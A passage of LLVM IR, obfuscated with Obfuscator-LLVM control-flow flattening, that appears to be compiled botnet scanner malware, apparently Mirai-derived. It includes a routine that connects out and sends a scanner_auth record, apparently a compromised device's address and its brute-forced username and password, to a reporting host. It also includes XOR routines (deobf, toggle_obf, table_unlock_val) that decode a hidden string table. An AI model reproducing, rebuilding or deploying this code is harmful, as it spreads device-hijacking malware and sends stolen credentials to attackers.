  %37 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %37, %struct.sockaddr** %36, align 8
  %38 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %39 = load %struct.sockaddr*, %struct.sockaddr** %38, align 8
  %40 = call i32 @connect(i32 %35, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  %42 = select i1 %41, i32 589941533, i32 -1637907851
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %9, align 4
  %45 = call i32 @close(i32 %44)
  store i32 -1637907851, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i8 0, i8* %11, align 1
  %47 = load i32, i32* %9, align 4
  %48 = call i64 @send(i32 %47, i8* %11, i64 1, i32 16384)
  %49 = load i32, i32* %9, align 4
  %50 = bitcast i32* %4 to i8*
  %51 = call i64 @send(i32 %49, i8* %50, i64 4, i32 16384)
  %52 = load i32, i32* %9, align 4
  %53 = bitcast i16* %5 to i8*
  %54 = call i64 @send(i32 %52, i8* %53, i64 2, i32 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 4
  %58 = call i64 @send(i32 %55, i8* %57, i64 1, i32 16384)
  %59 = load i32, i32* %9, align 4
  %60 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 0
  %62 = load i8*, i8** %61, align 8
  %63 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %64 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %63, i32 0, i32 4
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i64
  %67 = call i64 @send(i32 %59, i8* %62, i64 %66, i32 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 5
  %71 = call i64 @send(i32 %68, i8* %70, i64 1, i32 16384)
  %72 = load i32, i32* %9, align 4
  %73 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %74 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %73, i32 0, i32 1
  %75 = load i8*, i8** %74, align 8
  %76 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %77 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %76, i32 0, i32 5
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i64
  %80 = call i64 @send(i32 %72, i8* %75, i64 %79, i32 16384)
  %81 = load i32, i32* %9, align 4
  %82 = call i32 @close(i32 %81)
  store i32 -1451951048, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %46, %43, %26, %25, %21, %20, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #6
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* %15, i8* %16, i32 %19)
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 2018200722, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2018200722, label %20
    i32 -1087296275, label %26
    i32 730271742, label %59
    i32 1496348646, label %62
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = load i32*, i32** %4, align 8
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %21, %23
  %25 = select i1 %24, i32 -1087296275, i32 1496348646
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %6, align 8
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = xor i32 %32, 222
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %30, align 1
  %35 = load i8*, i8** %6, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = xor i32 %40, 222
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %38, align 1
  %43 = load i8*, i8** %6, align 8
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = xor i32 %48, 251
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %46, align 1
  %51 = load i8*, i8** %6, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, 175
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  store i32 730271742, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %5, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %5, align 4
  store i32 2018200722, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %6, align 8
  ret i8* %63

loopEnd:                                          ; preds = %59, %26, %20, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 1234619882, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1234619882, label %27
    i32 1648236611, label %35
    i32 117073076, label %84
    i32 -213179227, label %87
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  %34 = select i1 %33, i32 1648236611, i32 -213179227
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i32
  %38 = load %struct.table_value*, %struct.table_value** %4, align 8
  %39 = getelementptr inbounds %struct.table_value, %struct.table_value* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = load i32, i32* %3, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = xor i32 %45, %37
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %43, align 1
  %48 = load i8, i8* %6, align 1
  %49 = zext i8 %48 to i32
  %50 = load %struct.table_value*, %struct.table_value** %4, align 8
  %51 = getelementptr inbounds %struct.table_value, %struct.table_value* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = xor i32 %57, %49
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %55, align 1
  %60 = load i8, i8* %7, align 1
  %61 = zext i8 %60 to i32
  %62 = load %struct.table_value*, %struct.table_value** %4, align 8
  %63 = getelementptr inbounds %struct.table_value, %struct.table_value* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = xor i32 %69, %61
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %67, align 1
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i32
  %74 = load %struct.table_value*, %struct.table_value** %4, align 8
  %75 = getelementptr inbounds %struct.table_value, %struct.table_value* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = xor i32 %81, %73
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %79, align 1
  store i32 117073076, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %3, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %3, align 4
  store i32 1234619882, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %84, %35, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %.reg2mem = alloca i32*
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  store i32* %9, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 748261379, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 748261379, label %first
    i32 1601797741, label %12
    i32 -225435722, label %18
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %10 = icmp ne i32* %.reload, null
  %11 = select i1 %10, i32 1601797741, i32 -225435722
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load %struct.table_value*, %struct.table_value** %5, align 8
  %14 = getelementptr inbounds %struct.table_value, %struct.table_value* %13, i32 0, i32 1
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = load i32*, i32** %4, align 8
  store i32 %16, i32* %17, align 4
  store i32 -225435722, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.table_value*, %struct.table_value** %5, align 8
  %20 = getelementptr inbounds %struct.table_value, %struct.table_value* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  ret i8* %21

loopEnd:                                          ; preds = %12, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  store i32 %12, i32* %.reg2mem
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 1167364067, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1167364067, label %first
    i32 -520008745, label %16
    i32 1687364476, label %17
    i32 2065919310, label %18
    i32 647551099, label %23
    i32 1468792747, label %38
    i32 -47218514, label %44
    i32 1411709983, label %47
    i32 -427423025, label %48
    i32 -569704112, label %49
    i32 1909270859, label %50
    i32 -1143711409, label %53
    i32 -1217419721, label %54
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %14 = icmp sgt i32 %.reload, %.reload3
  %15 = select i1 %14, i32 -520008745, i32 1687364476
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 -1217419721, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 2065919310, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %10, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp slt i32 %19, %20
  %22 = select i1 %21, i32 647551099, i32 -1143711409
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8*, i8** %6, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8*, i8** %8, align 8
  %31 = load i32, i32* %11, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %29, %35
  %37 = select i1 %36, i32 1468792747, i32 -427423025
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %40, %41
  %43 = select i1 %42, i32 -47218514, i32 1411709983
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %10, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  store i32 -1217419721, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -569704112, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -569704112, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 1909270859, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %10, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %10, align 4
  store i32 2065919310, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 -1217419721, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %5, align 4
  ret i32 %55

loopEnd:                                          ; preds = %53, %50, %49, %48, %47, %44, %38, %23, %18, %17, %16, %first, %switchDefault
  br label %loopEntry
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146810738}
!2 = !{i32 -2146810329}
